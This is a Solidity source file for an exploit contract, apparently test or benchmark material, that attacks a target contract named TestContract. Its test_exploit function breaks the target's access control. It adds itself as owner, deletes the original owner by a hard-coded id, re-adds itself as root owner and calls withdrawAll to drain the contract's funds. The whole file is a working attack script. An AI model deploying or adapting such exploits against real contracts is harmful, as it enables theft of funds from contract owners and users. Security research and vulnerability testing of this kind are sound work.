pragma solidity ^0.4.23;

import "./target.sol";

contract Exploit {
    TestContract private target; // Importing the target smart contract

    constructor(address _target) public {
        target = TestContract(_target); // Assigning the target smart contract to the target variable
    }

    function() payable public {
        // Fallback function to receive payment
    }

    function test_exploit() public {
        // Breaking the access control of the target smart contract

        // Step 1: Adding the exploit contract as a new owner
        target.newOwner(address(this));

        // Step 2: Deleting the original owner
        target.deleteOwner(8279753857293);

        // Step 3: Adding the exploit contract as the new root owner
        target.newOwner(address(this));

        // Step 4: Calling a privileged function in the target smart contract
        target.withdrawAll();
    }
}